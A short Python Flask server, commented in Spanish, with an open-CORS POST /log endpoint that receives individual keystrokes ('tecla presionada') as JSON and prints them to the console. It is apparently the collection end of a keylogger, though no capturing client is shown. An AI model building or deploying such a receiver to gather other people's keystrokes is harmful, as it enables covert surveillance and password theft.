from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)  # Habilita CORS para permitir solicitudes desde cualquier origen

@app.route('/')
def home():
    return "Bienvenido a mi servidor Flask!"  # Mensaje de bienvenida en la raíz

@app.route('/log', methods=['POST'])
def recibir_log():
    try:
        # Verificar si la solicitud tiene contenido JSON válido
        data = request.get_json()
        if not data:
            return jsonify({"error": "Solicitud inválida, se esperaba JSON"}), 400
        
        # Extraer la tecla presionada
        key_pressed = data.get("key")
        if key_pressed is None:
            return jsonify({"error": "Falta la clave 'key' en el JSON"}), 400

        print(f"Tecla presionada recibida: {key_pressed}")  # Imprimir en la consola del servidor
        
        return jsonify({"status": "recibido", "key": key_pressed}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500  # Retorna cualquier error interno

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))  # Permite definir el puerto en una variable de entorno
    app.run(host='0.0.0.0', port=port)

